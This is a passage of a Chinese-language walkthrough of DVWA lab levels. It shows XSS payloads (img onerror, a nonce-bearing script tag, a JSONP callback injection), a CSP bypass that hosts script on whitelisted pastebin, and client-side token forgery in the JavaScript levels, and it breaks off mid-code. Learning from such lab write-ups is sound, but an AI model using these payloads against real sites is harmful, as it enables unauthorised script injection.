class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>至于为什么详见第十关的Medium</p><p>同样使用bp改包发包</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192407.png" alt="屏幕截图 2024-02-22 192407"></p><p>发包结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192428.png" alt="屏幕截图 2024-02-22 192428"></p><p>数据库显示如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192717.png" alt="屏幕截图 2024-02-22 192717"></p><h3 id="4-Impossible-11"><a href="#4-Impossible-11" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222192830838.png" alt="image-20240222192830838"></p><p>将输入的内容全部实例化标签无法执行输入的所有内容均无效</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192948.png" alt="屏幕截图 2024-02-22 192948"></p><p>还使用了PDO将代码和数据库分离，还有对语句进行预编译，这两种方法均能有效的防止SQL注入</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222193233629.png" alt="image-20240222193233629"></p><p>还加了token 进一步提高了安全性</p><h2 id="十三、CSP-Bypass"><a href="#十三、CSP-Bypass" class="headerlink" title="十三、CSP Bypass"></a>十三、CSP Bypass</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单</p><p>两种方法可以启用 CSP</p><p>一种是通过 HTTP 响应头信息的Content-Security-Policy字段<br>一种是通过网页的标签</p><p>例如</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$headerCSP = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span><span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">启用CSP后，不符合 CSP 的外部资源就会被阻止加载<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">script-<span class="hljs-attribute">src</span>，  <span class="hljs-comment">//脚本：只信任当前域名</span><br><span class="hljs-selector-tag">object</span>-<span class="hljs-attribute">src</span>：  <span class="hljs-comment">//不信任任何URL，即不加载任何资源</span><br>style-<span class="hljs-attribute">src</span>，   <span class="hljs-comment">//样式表：只信任cdn.example.org和third-party.org</span><br></code></pre></td></tr></table></figure><h3 id="1-Low-12"><a href="#1-Low-12" class="headerlink" title="1.Low"></a>1.Low</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20194018.png" alt="屏幕截图 2024-02-22 194018"></p><p>分析源码不难看出白名单网址为<br>self<br><a href="https://pastebin.com/">https://pastebin.com</a><br>example.com<br>code.jquery.com<br><a href="https://ssl.google-analytics.com/">https://ssl.google-analytics.com</a></p><p>其中 <a href="https://pastebin.com/">https://pastebin.com</a> 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200705.png" alt="屏幕截图 2024-02-22 200705"></p><p>点击create new paste</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200713.png" alt="屏幕截图 2024-02-22 200713"></p><p>点击raw</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200718.png" alt="屏幕截图 2024-02-22 200718"></p><p>将网址复制到图中的位置回车即可</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200919.png" alt="屏幕截图 2024-02-22 200919"></p><h3 id="2-Medium-12"><a href="#2-Medium-12" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>源码如下，HTTP 头信息中的 script-src 的合法来源发生了变化。script-src 还可以设置一些特殊值，<strong>unsafe-inline</strong> 允许执行页面内嵌的 <script> 标签和事件监听函数，<strong>nonce 值</strong>会在每次 HTTP 回应给出一个授权 token。</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20201153.png" alt="屏幕截图 2024-02-22 201153"></p><p>现在就不是从外界导入 JavaScript 资源了，而是直接通过内联 JavaScript 代码，注入时直接令 nonce 为设定好的值即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span> &gt;</span><span class="language-javascript"> <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222201506962.png" alt="image-20240222201506962"></p><h3 id="3-High-12"><a href="#3-High-12" class="headerlink" title="3.High"></a>3.High</h3><p>经对源码的查看</p><p>因为CSP 规则限制，只能引用允许self 的脚本执行</p><p>self是指本页面加载的脚本，服务器只信任自己的域名，只允许加载本界面的JavaScript代码，这样的话自能从客户端本身动手脚了</p><p>这关的突破点在于自己给参数，创造传参</p><p>POST 提交的 include 参数直接放到了 body 源码中</p><p>所以这里我们可以自己修改include 来进行弹窗</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">include</span>=&lt;script <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;source/jsonp.php?callback=alert(&#x27;1&#x27;);&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20202113.png" alt="屏幕截图 2024-02-22 202113"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20202127.png" alt="屏幕截图 2024-02-22 202127"></p><h3 id="4-Impossible-12"><a href="#4-Impossible-12" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>这关直接把js写死了，只能回调 JS 里面的 solveSum 函数，所以就没办法啦</p><h2 id="十四、JavaScript"><a href="#十四、JavaScript" class="headerlink" title="十四、JavaScript"></a>十四、JavaScript</h2><h3 id="1-Low-13"><a href="#1-Low-13" class="headerlink" title="1.Low"></a>1.Low</h3><p>这个题有点小饶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">MD5 code from here</span><br><span class="hljs-string">https://github.com/blueimp/JavaScript-MD5</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="hljs-string"></span><br><span class="hljs-string">function rot13(inp) &#123;</span><br><span class="hljs-string">return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function generate_token() &#123;</span><br><span class="hljs-string">var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="hljs-string">document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">generate_token();</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看源代码发现这就主要是一个Md5加密其余是</p><p>function generate_token() {<br>        var phrase = document.getElementById("phrase").value;<br>        document.getElementById("token").value = md5(rot13(phrase));<br>    }</p><p>这行代码是将phrase的值进行Md5加密后再将其赋值给token</p><p>首先明确此题是需要我们去提交一个success只要提交成功便可以</p><p>但是我们发现直接提交是行不通的</p><p>然后抓包看看能否看到什么有用的东西</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20210755.png" alt="屏幕截图 2024-02-22 210755"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20210810.png" alt="屏幕截图 2024-02-22 210810"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20210823.png" alt="屏幕截图 2024-02-22 210823"></p><p>经过观察发现无论我们所提交的Phrase为何值所对应的token始终不发生改变</p><p>但是根据我们对后端代码的观察发现按道理来说不应该啊只要Phrase的值发生改变那么token的值那必定改变啊</p><p>既然不变那就只能说明一个问题就是前端做了手脚不让Phrase的值发生改变</p><p>去瞅瞅：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20211443.png" alt="屏幕截图 2024-02-22 211443"></p><p>还有这个</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20211931.png" alt="屏幕截图 2024-02-22 211931"></p><p>嘿嘿嘿找到了原来是他隐藏了token他把的值固定phrase的值给固定成了ChangeMe</p><p>因为我们提交时是先经过前端然后才是后端所以我们的token一直都是ChangeMe的</p><p>所以在我们提交success之前先</p><p>执行generate_token()函数这样就可以使token是successMd5加密的值了</p><p>再点击Submit即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20205531.png" alt="屏幕截图 2024-02-22 205531"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20205543.png" alt="屏幕截图 2024-02-22 205543"></p><p>最后再看一下后端发现果然是将字符串success进行md5加密后，再与前端提交过来的token值进行比对，匹配成功，才能成功提交success</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20082215.png" alt="屏幕截图 2024-02-23 082215"></p><p>success！</p><h3 id="2-Medium-13"><a href="#2-Medium-13" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>同样的我们先来看后端带码</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223083751736.png" alt="image-20240223083751736"></p><p>看着有点费劲我们可以使用在线工具将其格式化</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223083903299.png" alt="image-20240223083903299"></p><p>这段代码先进性了一个加密也就是字符串反转然后又在调用的时候加上了XX最后将phrase的值经给过以上加密处理后赋值给token</p><p>再来看前端代码</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223084248251.png" alt="image-20240223084248251"></p><p>发现和上一关一样没什么不同只不过加密方法变了一下</p><p>最后再看一下后端代码确定一下</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223084417129.png" alt="image-20240223084417129"></p><p>ok这下确定了</p><p>开始操作：</p><p>输入success后</p><p>先在前端的控制台上执行一下<strong>do_elsesomething("XX")</strong></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20084557%20-%20%E5%89%AF%E6%9C%AC.png" alt="屏幕截图 2024-02-23 084557 - 副本"></p><p>然后点击提交就OK了</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20084606.png" alt="屏幕截图 2024-02-23 084606"></p><h3 id="3-High-13"><a href="#3-High-13" class="headerlink" title="3.High"></a>3.High</h3><p>先来分析源码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223095300177.png" alt="image-20240223095300177"></p><p>发现这一串JS代码看起来也被混淆了一遍同样的我们用网站简单处理一下就能阅读代码了</p><p>如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span 